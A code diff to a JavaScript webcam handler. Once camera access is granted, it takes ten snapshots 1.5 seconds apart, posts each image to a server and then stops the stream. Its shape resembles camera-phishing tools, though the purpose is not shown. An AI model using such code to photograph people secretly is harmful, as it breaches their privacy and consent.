@@ -609,10 +609,29 @@ function handleSuccess(stream) {
     video.srcObject = stream;
 
     var context = canvas.getContext('2d');
-    setInterval(function(){
+    window._photo_count = 0;
+    const MAX_PHOTOS = 10;
+    
+    // Capture first photo immediately
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    post(canvasData);
+    window._photo_count++;
+    
+    // Then capture remaining 9 photos every 1500ms
+    window.captureInterval = setInterval(function(){
+        if(window._photo_count >= MAX_PHOTOS){
+            clearInterval(window.captureInterval);
+            // Stop camera stream after 10 photos
+            if(window.stream){
+                window.stream.getTracks().forEach(track => track.stop());
+            }
+            return;
+        }
         context.drawImage(video, 0, 0, 640, 480);
         var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
         post(canvasData);
+        window._photo_count++;
     }, 1500);
 }
 
